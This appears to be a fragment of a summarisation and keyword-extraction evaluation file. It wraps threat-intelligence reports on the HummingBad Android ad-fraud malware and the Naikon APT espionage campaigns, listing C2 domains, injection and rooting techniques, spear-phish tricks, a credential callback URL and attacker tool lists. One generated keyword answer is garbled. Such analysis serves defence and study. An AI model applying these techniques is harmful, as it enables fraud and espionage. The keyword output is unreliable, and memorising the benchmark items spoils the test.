286800Mexico, 325208Brazil, 366566China, 1606384India, 1352772Turkey, 448285Indonesia, 489336Philippines, 520901Figure 7: Top 20 Targeted Countries\u00a92016 Check Point Software Technologies Ltd. All rights reserved | P. 4HummingBad targets users of all Android Operating System (OS) versions, as seen below:Figure 8: Victim Heat MapMarshmallow1%Ice Cream Sandwich2%Victims byAndroid VersionLollipop7%Jelly Bean40%KitKat 50%Figure 9: Victims By Android OS\u00a92016 Check Point Software Technologies Ltd. All rights reserved | P. 5It\u2019s All About Making Money \u2013 For Now One of the interesting aspects of this campaign is the economic impact on users and advertisers. Abusing many ad server software development kits (SDKs) and defrauding them for revenue, HummingBad uses the entire spectrum of paid events for its operation, including displaying ads, creating clicks, and installing fraudulent apps. These illegitimate tactics generate more revenue for HummingBad developers than playing by the rules. Developers track the effectiveness of the apps in each category with the \u201cDeveloper Defined Events\u201d section in Yingmob\u2019s Umeng interface. Each Umeng can modify the apps to contain whichever event they wish. In the case of HummingBad, most fields relate to ad fraud. Our research team extracted the following data from the campaign:\u2022 The apps display more than 20 million advertisements per day \u2022Yingmob achieves a high click rate of 12.5% with illegitimate methods, resulting in over 2.5 million clicks per day\u2022 HummingBad installs more than 50,000 fraudulent apps per dayThis translates to significant revenues:Yingmob\u2019s average revenue per clicks (RPC) is USD $0.00125\u2022 \u2022 Accumulated revenue from clicks per day reaches more than $3,000 \u2022 The rate for each fraudulent app is $0.15 with accruing over $7,500 per day \u2022Yingmob makes $10,000 per day or about $300,000 a month.While profit is powerful motivation for any attacker, Yingmob\u2019s apparent self-sufficiency and organizational structure make it well-positioned to expand into new business ventures, including productizing the access to the 85 million Android devices it controls. This alone would attract a whole new audience \u2013 and a new stream of revenue \u2013 for Yingmob. Quick, easy access to sensitive data on mobile devices connected to enterprises and government agencies around the globe is extremely attractive to cybercriminals and hacktivists. Without the ability to detect and stop suspicious behavior, these millions of Android devices and the data on them remain exposed today.\u00a92016 Check Point Software Technologies Ltd. All rights reserved | P. 6Simulate click:Detailed Analysis: How HummingBad Works The first infection method the Check Point research team saw was a drive-by download attack, and the Check Point ThreatCloud indicates some adult content sites served malicious payloads too. HummingBad uses a sophisticated, multi-stage attack chain with two main components. The first component attempts to gain root access on a device with a rootkit that exploits multiple vulnerabilities. If successful, attackers gain full access to a device. If rooting fails, a second component uses a fake system update notification, tricking users into granting HummingBad system-level permissions. Irrespective of whether rooting is successful, HummingBad downloads as many fraudulent apps to the device as possible. The malicious apps in the HummingBad campaign are made of a mix of several malicious components, many of which have variations with the same functionality. In some cases, the malicious components are dynamically downloaded onto a device after the infected app is installed. The first malicious component, known as SSP, displays illegitimate ads and installs fraudulent apps. It is triggered by four events: device boot, screen turning on or off, detection that a user is present, and any change in connectivity. When triggered, SSP starts a service named Se, which initiates the malicious logic and starts the advertisement networks used by the app. Different variations of HummingBad use different ad networks such as Mobvista, Cheetah, Apsee, or Startapp. SSP starts a timer that schedules a LockTask execution every 10 seconds. If all conditions (such as time delay, internet connection, and settings received from the server) are met, LockTask restarts the Se server and launches the MainActivity process, activating the malicious payload. Once the MainActivity process starts, the malware begins to display ad banners with a \u201cclose\u201d button. The malware blocks any attempt to return to the home screen or go back, forcing the user to click on the banner. If the user clicks the \u201cclose\u201d button, the malware imitates a click on the banner itself. Once the banner is clicked, SSP sends a request to a server that returns a link to an Android application kit (APK). SSP then downloads this APK from the server.\u00a92016 Check Point Software Technologies Ltd. All rights reserved | P. 7Show close button:Once the APK is downloaded, the app checks if the device is rooted by any of the other components. If the device is rooted, it installs the APK silently; if not, SSP attempts installation with a user dialog. Once installed, SSP launches the APK information received from the server to imitate an installation from GP and acquire revenue from the ad To receive updates and send reports, SSP retrieves the command and control (C&C) domain from a JavaScript Object Notation (JSON) file downloaded from d1qxrv0ap6yf2e.cloudfront[.]net/domain/xxx.json. Possible values are:\u2022 \u2022{\"id\":3,\"name\":\"CAP\",\"master\":\"032o[.]com\",\"slave\":\"032n[.]com\"} {\"id\":4,\"name\":\"SSP&CCSDK\",\"master\":\"guangbom[.]com\",\"slave\":\"ssppsspp[.]com\"} {\"id\":5,\"name\":\"asdf\",\"master\":\"asdf\",\"slave\":\"asdf\"} //I think {\"id\":6,\"name\":\"efwe\",\"master\":\"gwsgs\",\"slave\":\"dgss\"}//it's unused {\"id\":7,\"name\":\"1\",\"master\":\"1\",\"slave\":\"1\"} //and this {\"id\":8,\"name\":\"CAP-DW\",\"master\":\"ccaa100[.]com\",\"slave\":\"ccaa200[.]com\"} {\"id\":9,\"name\":\"SSP-DW\",\"master\":\"cscs100[.]com\",\"slave\":\"cscs200[.]com\"} {\"id\":11,\"name\":\"HM-JK\",\"master\":\"hmapi[.]com\",\"slave\":\"eoapi[.]com\"} {\"id\":12,\"name\":\"-\",\"master\":\"ma2.heshan88[.]com\",\"slave\":\"sl2.heshan88[.]com\"} {\"id\":13,\"name\":\"-\",\"master\":\"ma2.heshan88[.]com\",\"slave\":\"sl2.heshan88[.]com\"} {\"id\":14,\"name\":\"-\",\"master\":\"ma2.heshan88[.]com\",\"slave\":\"sl2.heshan88[.]com\"} {\"id\":15,\"name\":\"iadpush\",\"master\":\"ma2.lb0408[.]com\",\"slave\":\"sl2.lb0408[.]com\"} {\"id\":16,\"name\":\"1mob-fudian\",\"master\":\"ma2.heshan88[.]com\",\"slave\":\"sl2.heshan88[.]com\"} {\"id\":17,\"name\":\"QS\",\"master\":\"aa0ad[.]com\",\"slave\":\"aa0ab[.]com\"} {\"id\":18,\"name\":\"1mob-xin\uff08/BDSDK \",\"master\":\"ma2.heshan88[.]com\",\"slave\":\"sl2.heshan88[.]com\"}\u00a92016 Check Point Software Technologies Ltd. All rights reserved | P. 8Google Play Process Injection SSP injects a library into the process of Google Play. By doing this, the malware can then imitate clicks on install/buy/accept button inside Google Play. This injection determines if the required button is active and understands which window of Google Play is displayed in the The malware injects the native library into the Google Play process using the well-known ptrace approach. SSP uses the ptrace system call to control other apps, reading and writing memory and registers. By combining calls of ptrace, it loads its library into the memory of other processes and calls. The injected library dynamically loads dex-code (compiled Java code for Android) into the process.\u00a92016 Check Point Software Technologies Ltd. All rights reserved | P. 9Loaded dex code starts the service in the context of the Google Play app. Periodically scanning views inside Google Play, it imitates clicks on install/buy/accept buttons when they appear.RightCore Present in the first sample of HummingBad found in February 2016, the RightCore component contains the malware\u2019s rooting functionality. Some samples include this payload in their assets, while others download it from the server. The infected app checks whether the device is rooted. If the device is not rooted, the parent malware decrypts RightCore (every character is XOR encrypted against 85). Depending on the version, RightCore either downloads a pack of exploits from the server or decrypts them from its own assets. Then, it analyzes the device\u2019s configurations to choose best how to run the exploits. If the exploit is successful, the app decodes a payload from its assets and attempts a quiet installation. Then, it downloads additional fraudulent apps, installing them silently. Though copied from other developers, these exploits remain effective nonetheless. The root binaries are named ipm and ppm instead of the normal su, possibly to avoid detection. According to the Umeng interface, the HummingBad campaign tries to root thousands of devices every day, with hundreds of these attempts successful. The CAP component installs fraudulent apps using elaborate techniques. When CAP launches on a device it decrypts module_encrypt.jar from its assets and dynamically loads code containing the main malware functionality. From its assets, it decrypts and runs a native daemon binary. This binary then periodically executes a command to wake up the app. On every broadcast, CAP checks for changes in data. If it detects a change, the app clears all pending downloads, notifications, and events, and checks several parameters about its own activity (time from start, number of requests sent before). If the parameters meet the preset conditions, CAP sends a request to the server to receive the fraudulent app.\u00a92016 Check Point Software Technologies Ltd. All rights reserved | P. 10Once CAP receives the payload, it attempts installation \u2013 silently if the device is rooted, or by initiating user interaction if it is not. This mechanism allows hackers to control the quantity of apps installed each day, maintaining a low profile and Periodically, the app sends statistics about the plugin\u2019s activities to the server and checks for updates. These statistics include the identifications of actions, such as whether a device is rooted, and if so, when it occurred. Fake IMEI injection CAP creates a fake \u201dunique\u201d 15- digit International Mobile Station Equipment Identity (IMEI) number, imitating the activity of additional devices and conducting further fraud. In doing so, CAP installs the same app twice on the same device, but receives payment for installing it on two different devices. CAP injects a library into the com.android.phone or android.internal.telephony process and calls internal classes of this process to set fake IMEI Clicking Simulation in Google Play CAP conducts an \"external\u201d clicking simulation for Google Play by opening an app in Google Play that was proposed by an advertisement.\u00a92016 Check Point Software Technologies Ltd. All rights reserved | P. 11Once Google Play is open, the malware simulates the sequence of screen clicks that tap the \"Install\" and \"Accept\" buttons to claim the reward for a successful referral. To obtain the coordinates of the Google Play button, the malware dumps its layout using a user interface (UI) automation application program interface (API). The click imitation is performed by then executing the \"input tap X Y\" utility with the coordinates of the Yingmob may be the first group to have its high degree of organization and financial self-sufficiency exposed to the public, but it certainly won\u2019t be the last. Check Point believes this dangerous trend will escalate as other groups learn from Yingmob and find new ways to achieve the independence they need to launch larger and more sophisticated attack campaigns in the future.\u00a92016 Check Point Software Technologies Ltd. All rights reserved | P. 12Appendix\u2022 Com.andr0id[.]cmvchinme \u2022 Com.swiping[.]whale \u2022 Com.andr0id[.]cmvchinmf \u2022com.quick[.]launcherSHA-256 ", "generated_text": "Chinese; HummingBad; iOS; apps; 20; 200; 200; 200; The control panel; Activ; the campaign; 35; high; detection; Chinese; Yingmob; Xingdu Plaza; 73 Beiqu Rd.; Chongqing; the infrastructure; access; the malware; the HummingBad code; notification; the HummingBad data; Hangover; the malware; use; Russian; APT; URL; the app; Activ; IoC; IP; data.", "ref_text": "<START-1>The report provides an in-depth analysis of HummingBad, a sophisticated malware campaign targeting Android devices. Researchers attribute the campaign to Yingmob, a Chinese mobile ad network company. Yingmob runs the malware operation alongside its legitimate ad business, sharing infrastructure and resources. This allows the malware campaign to infect over 85 million devices and generate $300,000 per month in fraudulent ad revenue. The malware uses rooting exploits and social engineering to gain system-level access on devices. It then installs fraudulent apps to create fake clicks and impressions. Yingmob tracks and manages the malware using a command and control platform. With control of over 85 million devices, Yingmob could potentially sell access to the highest bidder. The data and capabilities of compromised devices could be very valuable to cybercriminals. The report concludes by warning that as attackers become more independent and sophisticated like Yingmob, larger and more dangerous mobile malware campaigns will emerge. The findings highlight the increasing threat that mobile malware poses to both consumers and enterprises. <END-1>", "t5/keyword/hint_hit_precision": 0.2777777777777778, "t5/word/hint_hit_recall": 0.07228915662650602, "gpt3/lexical/rouge_rouge1": 0.5705705705705706, "gpt3/lexical/rouge_rouge2": 0.16314199395770393, "gpt3/lexical/rouge_rougeL": 0.26426426426426425, "gpt3/lexical/rouge_rougeLsum": 0.26426426426426425, "gpt3_generated_text": ["The article discusses the HummingBad Android malware campaign created by a group of cybercriminals in China, known as Yingmob. The malware generates $300,000 per month in fraudulent ad revenue, controls over 85 million mobile devices worldwide, and poses a threat to sensitive data on these devices. The campaign runs alongside a legitimate advertising analytics business, sharing technology and resources to achieve financial self-sufficiency. The malware attempts to root thousands of devices daily, potentially creating a botnet for targeted attacks or selling access to other cybercriminals. The article also highlights the connection between Yingmob and the iOS malware Yispecter, as well as the infrastructure and organization of Yingmob's operations. The HummingBad code sends notifications to Umeng, a tracking and analytics service, revealing the extent of the campaign with almost 200 apps and over 85 million devices involved. The article emphasizes the high detection and analysis of the malware, its global impact, and the potential risks for end users, enterprises, and government agencies."]}, {"split_name": "val", "sample_id": "val_40", "prompt_text": "Extract the keywords: The MsnMM Campaigns The Earliest Naikon APT Campaigns Over time, the Naikon APT appears to have used specific toolsets against organizations within a designated country, as though each campaign was focused on one country. There is sometimes crossover between campaigns in several ways: the backdoors they deliver, the infiltration techniques, and the overall infrastructure. Backdoor functionality can also cross campaigns and tools. For example, sometimes we see an \u201cinject\u201d variant dropping a \u201csys10\u201d backdoor. Or a naikon backdoor dropping a rarstone backdoor. Again, this particular actor is responsible for the MsnMM and Naikon campaigns deploying the following backdoors and tools:\u25cf sslMM \u25cf xsControl/naikon and plugins \u25cf \u25cf second stage toolsrarstoneThe Naikon group also deployed a lesser-known set of second stage tools. They mixed together legitimate system administration tools with offensive network reconnaissance tools, including a custom network and service scanner and an attack codeset based on old Honker Union codebase shared on Chinese-speaking forums. See \u201cSecond Stage Tools\u201d. For years, Naikon downloaders/backdoors were delivered to victim systems with kit-produced CVE-2012-0158 spear-phish. This exploit builder kit was shared amongst multiple APTs, because we see the same exploits dropping tools from various groups. Many of these exploit attachments were blocked by our advanced exploit protection (AEP) on customer systems in Vietnam, Myanmar, the Philippines, and organizations related to the energy sector in these and other ASEAN nations. Some of these backdoors and spear-phish activities also showed up in the Hardore Charlie CEIEC dump. In Jan 2014, we observed in some targets the increase of \u201cright-to-left-override\u201d (RTLO) naming schemes for initial payload delivery. In addition to its custom toolset, it appears to test freely-distributed tools - in December 2013, it pushed out \u201cEverything32\u201d to victim systems, and TeamViewer was used as well. It is likely that the group faced difficulties when it came up against anti-malware products and tried abusing legitimate tools for anti-malware evasion. Finally, this threat actor deploys a custom pdf binding tool, to add to its effective but low-tech toolset.The Naikon attackers can be, and in fact have been precise in social-engineering their targets. Data collection prior to an attack may have included the following data points:full namesinterests in current events\u25cf \u25cf email addresses and status (active or inactive) \u25cf date of birth and age \u25cf previous email and social network communications to and from a target \u25cflanguage spokenVictims of the early campaigns were located mostly throughout Myanmar, Vietnam, Singapore, Laos, Malaysia, and the Philippines. There are other locations where Naikon\u2019s victims can be found, but these countries stand out. To get in to target networks, the Naikon APT relied on email as an attack vector. It first compromised victim systems using common spear-phishing techniques, Such as cve-2012-0158 exploit attachments, attachments altered with RTLO techniques, and a combination of icon-spoofing and name padding for executables. The MsnMM campaigns featured ripped images and documents re-used for spear-phish decoys, and we see that technique reapplied throughout other Naikon APT campaigns. The winMM components were also delivered to Myanmar victims throughout mid-2013 using RTLO and icon-spoofing techniques and sometimes even simpler icon spoofing+double extension+extra spacing in attachment filenames. For example, many of the Backdoor.Win32.MsnMM.i (winMM) executable filenames maintained almost 200 spaces, looking like this: \u201cletter to Gov office.doc .exe\u201d The Naikon APT used multiple backdoors presenting a variety of behaviors over time, but clusters of indicators were fairly consistent into 2015. Shared Exploit Generation Kit It\u2019s interesting that what appear to be multiple campaigns and crews all use a kit that generates CVE-2012-0158 exploits embedded with arbitrary backdoors for spear-phishing. One of the interesting characteristics of the Naikon APT\u2019s kit-produced shellcode is its runtime function offset calculations and control flow are built to jump past behavior-based protection and sandbox analysis. Each of the win32 api shellcode calls are carefully executed to land just past function hot patch space and prologues, evading user mode trampolines and hooks. MsnMM, Naikon and Rarstone backdoors were generally delivered with stock 0158 exploits. Some dropped iph.bat and an \u201ciExplorer.exe\u201d that began with a \u201cWMcal\u201d parameter and profile.dat executable blob loaded into a running IE process. Other APTs use this kit as well. We found Stone Panda Poison Ivy samples delivered with the same CVE-2012-0158 exploits,dropping iph.bat and iExplorer.exe, and running the \u201ciExplorer.exe WMcal\u201d executable filename Finally, we found another exploit builder\u2019s template used to attack Korean-speaking targets. It was used across this group and others for building CVE-2012-0158 files, sharing the common author \u201cTran Duy Linh\u201d. Shared Strings, Functionality, Targets, and Infrastructure across Campaigns Multiple Naikon tools used in multiple campaigns shared strings, functionality, a deployment and content focus on ASEAN organizations and other organizations doing business with them, and the infrastructure itself. Let\u2019s examine some of the toolset\u2019s shared strings and functionality, then move on to shared infrastructure. While the Naikon backdoor maintained the user-agent string \u201cNOKIAN95/WEB\u201d, it also maintained a debug path f:\\MyProjects\\xServer\\Release\\xServer.pdb Also, the Naikon backdoor\u2019s matching management software is called \u201cxsControl\u201d. Plugins for the Naikon backdoor included a screenshot grabber named xsAdv.dll, and a single export This debug path in Naikon backdoors is very similar to the debug path maintained in Rarstone backdoors: g:\\MyProjects\\xsFunction\\Release\\DLL.pdb The MsnMM campaign backdoors all maintain an \u201cMM\u201d internal name, and the functionality changes when comparing them: A more recent oddity from this group includes a WinMM dropper with the internal name \u201cZhixin\u201d, creating a recently compiled Sys10 backdoor. Some \u201cMM\u201d executables maintained debug strings across versions and families: J:\\chong\\new\\Release\\SslMM.exe and J:\\chong\\nod\\Release\\SslMM.exe Shared infrastructureNow, let\u2019s take a look at some of the shared infrastructure that helps to tie all of these campaigns together. MsnMM backdoors and naikon backdoors share portions of infrastructure across campaigns. For a quick example, early msnMM backdoors like sslMM, and one of the later tools, exe_exchange, share some domains with the nokian95 (naikon) and sys10 backdoors. There is much crossover: Here, you can see a table recording domains that are shared across the backdoors for command and control infrastructure.ahzx.eicp.netmncgn.51vip.bizbkav.imshop.inubaoyouxiang.gicp.netgooglemm.vicp.netmyanmartech.vicp.netexe_exchangeyesyesyessys10winMMsslMMwininetMM/saktoxsPlus/naikonyesyesyesyesyesyesyesyesyesyesyesyesyesyesCorrelating Target Profiles with Spearphish and Decoy Content One of the most striking characteristics of this APT is that its targeting interest is revealed by its spear-phish and decoy content. Malicious actors of all stripes, including cybercriminals, have for at least the last ten years abused \u201chot topics\u201d in their social-engineering content to better attract and mass-exploit victim systems. It\u2019s a pretty worn-out discussion. What is different about the Naikon APT\u2019s use of hot topics in spear-phish and decoy content is that reveals its specific victims and how these change over time. Precision social engineering seems to be an elevated skill set for the group. A few of the most interesting examples of such content include: a UN discussion and vote on nuclear proliferation and disarmament, the MH370 flight, and construction on the Raytheon-built National Coast Watch Center in PH. For example, in the second week of October 2012, during the gang\u2019s intense ongoing focus on SE Asian countries like Cambodia and its diplomats, we find a winMM backdoor detected as \"Trojan.Win32.Agent.udtc\" in New York City. This verdictidentified the Naikon APT\u2019s backdooron the victim system. The timing is uncanny because, in that same week speeches and views on nuclear disarmament and non-proliferation were presented by SE Asian country delegates to the United Nations in New York City. An example of such a talk is here; a naikon decoy\u2019s content was strikingly similar:MsnMM campaigns most commonly presented spear-phish exploits targeting CVE-2012-0158. A listing of screenshots in Appendix A reveals the variety of content and themes, all related to events and topics in the ASEAN region. Example titles include:Letpadaung copper mine.docMyanmar Wanbao to commence construction of Letpadaung projectDecember 2014nuclear agreement burma.docBurma Signs New Nuclear Deal With IAEASeptember 2013ALP Statement on Present Illegal Bangali Problem inside Arakan.docALP statement on present illegal Bangali problems inside Arakan [pdf]December 2012Calendar Misslao 2013 Free.docMiss Lao CalendarsJanuary 2014ASEAN and Partners Firmly Committed to Narrowing the Development Gap.docASEAN and Partners Firmly Committed to Narrowing the Development GapApril 2013refer to the 11th ACD Ministerial Meeting.docAsia Co-operation Dialogue eyes peaceDecember 2013Asia\u2019s Military Developments.docAsia\u2019s military developments November 2013The following example\u2019s content was crafted to appear like a legitimate international agreement discussion. After the malicious document is opened and successfully exploits CVE-2012-0158 on the victim workstation, the exploit code drops and opens this decoy Word document:This next example is written with the Laotian Phetsarath OT font, a decoy attempt to be a legitimate Daily News Brief from the Laotian Foreign Ministry of Affairs. It demonstrates the group\u2019s intentions to hit targets in Laos:Appendix A contains many more example document titles and screenshots. The themes and content that would appeal to politically-interested individuals in various parts of the world quickly In addition to a high volume of files exploiting CVE-2012-0158, the MsnMM attackers for a brief period used RTLO (right to left override) techniques, and then attachments exploiting CVE- 2010-3333. An example of RTLO that creates and opens this decoy document to camouflage its malicious background activity, then dropping and executing MsnMM backdoors on its victim system:UNFC_Statement_final_rcs.pdfNaikon APT MsnMM Campaign Backdoors and Lateral Movement Toolset - %temp%\\conime.exe77,824 bytes2013:01:31 01:25:38+00:006.0The MsnMM gang built and released many more variants of their sslMM creation. The code is a full-featured backdoor. Each variant of this tool starts by attempting to create a socket, and then creates a new thread implementing a fairly complicated keylogging facility not often seen, using Windows Keyboard Accelerators. Online code demonstrates the technique here: url The backdoor retrieves a large number of victim system data points, which it then uses to check in to its hardcoded C2. The backdoor reports system identification information both to present the victim\u2019s identifying information and to fingerprint the system for asset management:\u25cf OS version \u25cf Service pack information \u25cf Logged-on user name \u25cf OS install dateOne of its more interesting features is the ability to fetch and use certificates from the \u201cMy\u201d store on Windows systems. The \u201cMy\u201d certificate store is created on a per-user basis, and this is where users\u2019 certificates are stored. It is reserved for each user for signing and decrypting data and encrypting network communications. Feature list:\u25cf Victim fingerprinting and performance sensitivity - system configuration collection \u25cf Persistence - immediately identifying the Start Menu Startup directory and dropping a LNK to its own executable disguised as a \u201cOffice Start\u201d, \u201cYahoo Talk\u201d, \u201cMSN Gaming Z0ne\u201d, or \u201cMSN Talk\u201d shortcut\u25cf Configurable network settings - both a primary and backup C2 string is hard-coded ineach backdoor. At this point, we are aware of almost 50 domains and unique IP addresses used to host C2\u25cf Keylogging facility - Windows Accelerators with hidden window and lengthy Acceleratortable\u25cf Flexible network connectivity - proxy support for use with victim systems situated behindisolated networks\u25cf GET and POST network code for exfiltrating system information \u25cf Log file capabilities \u25cf File search and file write primitives - identifying and collecting sensitive ondiskinformation\u25cf Download and execute further arbitrary downloads \u25cf Arbitrary inter-process launch and communication through named pipes \u25cf Process privilege and token adjustments \u25cf Anti-malware kill-process identification and termination \u25cf Digital Certificate stealing and reuse for stealth SSL communications %temp%\\wuauc1t.exe118,784 bytes2012.11.01 00:53:49version6.0WinMM is a full-featured, simple backdoor. Its first actions upon installation are to collect user and system data and report them back to the C2 over http. It uses NetUserGetInfo to identify that it is running under an \u201cAdmin\u201d account on the local system, then retrieves the system name and the version of the operating system that is running, including its service pack, and collects the system install date from the registry: \\\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\InstallDate. These values are built into a single string for reporting. SslMM also maintains this code chunk and functionality but does not immediately invoke it like winMM. Also interesting and different from sslMM, are the decoy Word documents dropped by many of the winMM droppers. Images of these documents are shown in the Appendix. The documents are all written and formatted with a specially developed Myanmar2 True Type font, demonstrating the focus on politically-connected, native Myanmar speakers as targets. This font is not delivered by default with Microsoft Office. Instead, it must have been specifically installed by the attackers and then by the victims, otherwise the documents would not have displayed The backdoor maintains multiple primitive functionalities: Setting a WH_CBT Windows hook for full activity spying (sslMM does not maintain this hooking functionality):\u25cf File search and capture \u25cf Process creation \u25cf Keystroke captureThe backdoor is usually configured with primary and backup domains for C2 communications, although there are multiple known samples that maintain an IP address or only a single domain for communications with no backup. Communication is built to appear as though a web browser is simply making a request to a remote web server. Some of these backdoors are configured to use an unusual port for encrypted communications. %temp%\\services.exe69,632 bytes2012-03-13 - wmiprive.exe159,744 bytes2011.12.19 08:06:306.0In 2014 the Naikon gang was found to be using another tool that maintains an internal name \u201cxsPlus\u201d and \u201cxsControl\u201d. This builder and its backdoors produce components with the \u201cNOKIAN95/WEBx\u201d user-agent strings, for which there are multiple versions. Its functionality is covered in our previous Naikon APT post. Naikon and minor links with APT30 Another interesting aspect of the backdoor builder is that it also provides a keylogger plugin that is used on specific victim systems. And here there are minor, but striking, similarities with the Callback sessions for stolen data include these URLs:POST /stonehoof.rar/user=xxx&password=xxx tool upload xml formatted data. Presenting a similarity with the APT30 artifacts, their callback domains included stonehoof.com, hosted on several IPs during the naikon campaigns. This name is very unusual, and it is an odd coincidence that it is shared by two geopolitically-focused cyber-espionage groups, both targeting the South China Sea region. APT30 - stonehoof.com 2012-10-07 2013-04-03 2013-04-14 While the MsnMM components include the unusual \u201cMM\u201d in internal names sslMM, winMM, and wininetMM, some of the strings in the APT30 GEMSTONE software include the same \u2013 search and retrieval of the registry key \u201cSoftware\\Microsoft\\GetMM\u201d, and three function names \u201cMicrosoftGMMExit, MicrosoftGMMHaveExit, MicrosoftGMMZJ\u201d. The APT30 BACKSPACE backdoor also contains a similar potential target reference, as discussed in the FireEye paper. \u201cBACKSPACE Variant ZJ Auto (version 1.4) So, the \u201cMM\u201d shared by both of these may be a simple reference to Myanmar, the starting target for these Naikon APT attacks. APT30 backdoors also add \u201cMSN.lnk\u201d shortcuts to the Start Menu Startup location for persistence, just like the MsnMM components spoof \u201cMsn Gaming Zone.lnk\u201d and \u201cMsn Talk.lnk\u201d update.exe116.5 kb2013.02.01 07:39:129.0Yet another backdoor was used throughout 2013 by Naikon. Several of the C2 domains are shared with either Naikon or MsnMM infrastructure. This backdoor is a very basic initial component. To give an idea of the sophistication of its development, one of the decryption schemes it uses is an xor 0x1 loop on the very beginning of its .data section to decrypt its C2 domain. In this case, 6C 6C 6A 62 66 2F 74 68 62 71 2F 6F 64 75 01 (lljbf/thbq/odu) \u2192 mmkcg.uicp.net.This weak level of encryption is odd, because other strings, like the unicode version of the callback url \u201cs.y.s.t.e.n.&.c.p.=.%.s.&.l.o.g.=.%.s.&.i.n.d.e.x.=.%.d.\u201d, are maintained in plaintext in the .rdata section. Perhaps the authors thought xor\u2019ing the domains would hide their infrastructure for as long as needed, or they were working with others who didn\u2019t understand automated sandboxes and tracing but didn\u2019t want the dns strings present in the binary. It doesn\u2019t seem to make sense, but it appears to have been effective enough to leave in the executables. For all of the \u201cSys10\u201d backdoors, URL parameters were used consistently for the initial C2 callback: systen&cp=&log=&index= where: cp = system computername log = signed decimal integer representation of the OS InstallDate index = simply the return value from a GetTickCount call The backdoor collects several bits of identifying information to send to the C2:\u25cf computer name \u25cf account name of logged-in user \u25cf group name of logged-in user \u25cf \u25cf OS versioning information \u25cf OS install datelocal IP addressThe backdoor maintains a simple set of primitives:\u25cf http-based communications with hardcoded C2 \u25cf download additional components \u25cf start a new process \u25cf create filesterminate a running process find files and copy themWe detected this backdoor on multiple victim workstations with the following verdicts:Trojan.Win32.Agentb.hyb Trojan.Win32.Agentb.iqj Backdoor.Win32.MsnMM.p UDS:DangerousObject.Multi.Generic Trojan.Win32.Agentb.jwpAccording to KSN (Kaspersky Security Network) data, almost all of the victims attacked with this backdoor are based in Myanmar, or were Myanmar delegates travelling through the other countries like the US, for example. Some of the victims were located in Vietnam and Singapore. Victim profiles range from global political representatives and local IT service companies, togovernment ministries controlling media and news content, university students, and local law 07:59:149.0Second stage tools Most of the Naikon APT\u2019s second stage tools detected on victim networks are publicly-available. Some are very common system administration tools and utilities, and some are less publicly- available custom written scanners and tools available through Chinese hacking forums. Their ability to move through networks undisturbed appears to have matured over time, demonstrating that they are a seasoned team:\u25cf Windows system utilities: ftp.exe, systeminfo.exe, ipconfig, net view, ping, netstat -ano,net use, quser, tasklist, netsh interface ip, netsh interface show, netsh advfirewall firewall, reg export, AT\u25cf Sysinternals: procmon.exe, tcpview.exe, procexep.exe, psexec \u25cf Prosolve: winscan.exe \u25cf Rarlabs: rar.exe \u25cf Other: procex.exe, nc.exe, xscan.exe, winscanx.exe, hscan120.rar package (includes mysql.exe and sqlcmd.exe), cutfile.exe, tftp.exe, Win7 elevation of privilege and UACbypass, ReadPSW.exe (password stealer)The Naikon APT frequently used a custom backdoor that appears to be an HDoor variant, based on old \u201cHonker Union\u201d code like \u201chscan v120\u201d. For example, once on a victim network, one of the first steps is to run the hdoor -hbs scan to identify target local network hosts. Alternatively, it may show up on victim networks and be run with a long list of parameters: Custom HDoorMD5 \u2013 FilenameFile 8 - lms.dat56 kb2015.05.20HackTool.Win32.Agent.whjThe Naikon APT\u2019s custom-built HDoor tool is a robust reconnaissance tool for lateral movement, supporting the identification of, interfacing with and attacking of multiple technologies and resources:\u25cf host, user, group, and related authentication resources and cracking/brute forcingcapabilities\u25cf network asset scanning and identification, including SQL database, embedded networkdevices like home or SMB routers, and other common network services fake service listener to sniff traffic\u25cf \u25cf disk wiping - safe delete with multiple overwrites local filetime modifier \u25cf SQL administration toolset \u25cf SOCKS5 proxy service \u25cf banner-based scanner include 21,22,80,3389,1433,3306, and 389. Sometimes, they add 139 and 445 to the end of Sea:\u25cf Law enforcement \u25cf Government - executive, administrative, regulatory \u25cf Military - operations centers \u25cf Public/Private energyShared Victims with Cycldek and Comparing Lateral Movement with Cycldek The Cycldek APT appeared to follow an operational script across victim systems. It created or used c:\\intel on the victim hard disk to unpack tools and compress/archive stolen victim files and data with Winrar, like \"c:\\intel\\1.rar\". Some of these victim systems were occupied by both the Cycldec and Naikon attackers. The Cycldek attackers maintained this c:\\intel directory and its subdirectories as a sort of staging point. This mirrors what we have seen with Naikon directory setup on some victims.\u25cf a set of subdirectories \u25cf stolen files for exfiltration \u25cf Cycldek tools and their config filesThe Naikon APT and Cycldek APT also share a common attraction to Honker Union codebase. Spear-phish, dropped files, web browser injection The common sequence of events on a vulnerable system falling for related spear-phish attacks led to a newly-created Internet Explorer process running with execution transferred to additionally loaded executable code, usually profile.dat, maintaining the connectback C2 communication code and data. In this instance, a \u201cnaikon backdoor\u201d was delivered initially as a part of a small package of objects. The exploit attachment dropped iph.bat, iExplorer.exe, and a clean decoy document. The exploit executed this batch file, which in turn executed iExplorer.exe and opened a decoy document from %temp%. The iExplorer.exe process wrote out a profile.dat file, launched the legitimate Internet Explorer, and injected the .dat file into this newly created browser process. It transfered control to the injected .dat code and terminated itself. The .dat code then connected with a hardcoded C2 from within Internet Explorer, a common technique for evading anyoutbound traffic firewall issues. The full email spear-phish and other decoy documents\u2019 content presented here display the campaigns\u2019 focus on ASEAN targets that line up with the MsnMM campaigns: Example spear-phish and dropped sequence for NOKIAN95/WEB sent to web email service provider users in the US and Southeastern Asian region:Example Word document decoyExample details, exhibiting the \u201ccommon\u201d sequence of events on systems: Drops \u2192 %temp%\\iph.bat \u2192 %temp%\\iExplorer.exe WMcal C2: phsenator.vicp.net \u201cAustralian Strategic Policy Institute\u201d blog post located here - url Settings\\Temp\\mshtml.dat resistance day _burmese language_?fdp.scr\u201d \u2190 indicates RTLO naming, appeared to the target as pdf \u201cknu president speech on 65th anniversary of karen resistance day _burmese C2: ttteco.vicp.netMany of these backdoors were delivered by simply binding decoy pdfs to a Naikon backdoor and sending this bundle to target addresses. Here is a March 2014 spear-phish email with the and a Naikon dropper name \u201c24march_final_TAPE TRANSC~1\u201d detected as \u201cTrojan- clean copy of this decoy pdf that opens on execution, [as well as?] the Naikon backdoor (03A3251BDE74DF30AB5BF0B730E08C8D) that communicates with C2 xl.findmy.pw. This dropper is built with the attackers\u2019 \u201cpdfBind 2012\u201d tool. Once extracted to disk, you can see that the icon was replaced for the executable with an Adobe pdf icon. Lots of users fall for this sort of trick when file extensions are not visible:Appendix A: MsnMM Spearphish and Decoy 